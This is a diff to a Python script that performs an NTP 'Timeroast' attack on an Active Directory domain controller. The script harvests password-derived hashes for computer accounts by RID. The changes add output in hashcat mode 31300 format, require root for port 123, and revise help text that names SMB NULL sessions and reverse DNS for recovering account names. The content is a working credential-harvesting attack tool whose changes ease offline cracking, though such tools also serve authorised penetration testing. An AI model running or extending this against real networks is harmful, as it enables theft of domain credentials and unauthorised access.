@@ -17,6 +17,10 @@ NTP_PREFIX = unhexlify('db0011e9000000000001000000000000e1b8407debc7e50600000000
 DEFAULT_RATE = 180
 DEFAULT_GIVEUP_TIME = 24
 
+def hashcat_format(rid : int, hashval : bytes, salt : bytes) -> str:
+  """Encodes hash in Hashcat-compatible format (with username prefix)."""
+  return f'{rid}:$sntp-ms${hexlify(hashval).decode()}${hexlify(salt).decode()}'
+
 
 def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float) -> List[Tuple[int, bytes, bytes]]:
   """Gathers MD5(MD4(password) || NTP-response[:48]) hashes for a sequence of RIDs.
@@ -29,7 +33,10 @@ def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float) -
 
   # Bind UDP socket.
   with socket(AF_INET, SOCK_DGRAM) as sock:
-    sock.bind(('0.0.0.0', 123))
+    try:
+      sock.bind(('0.0.0.0', 123))
+    except PermissionError:
+      raise PermissionError('No permission to listen on port 123. Please run as root.')
 
     query_interval = 1 / rate
     last_ok_time = time()
@@ -66,16 +73,15 @@ def get_args():
 
   argparser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=\
 """Performs an NTP 'Timeroast' attack against a domain controller. 
-Outputs hex encoded<RID>:<hash>:<salt> triplets where the 'hash' is 
-defined as MD5(NTLM-hash || salt).
-
-The timecrack.py script can be used to run a dictionary attack against the 
-hashes.
+Outputs the resulting hashes in the hashcat format 31300 with the --username flag ("<RID>:$sntp-ms$<hash>$<salt>").
 
 Usernames within the hash file are user RIDs. In order to use a cracked 
 password that does not contain the computer name, either look up the RID
 in AD (if you already have some account) or use a computer name list obtained
 via reverse DNS, service scanning, SMB NULL sessions etc.
+
+In order to be able to receive NTP replies root access (or at least high port
+listen privileges) is needed.
 """
   )
 
@@ -138,7 +144,7 @@ def main():
   args = get_args()
   output = args.out
   for rid, hashval, salt in ntp_roast(args.dc, args.rids, args.rate, args.timeout):
-    print(f'{rid}:{hexlify(hashval).decode()}:{hexlify(salt).decode()}', file=output)
+    print(hashcat_format(rid, hashval, salt), file=output)
   
 
 if __name__ == '__main__':
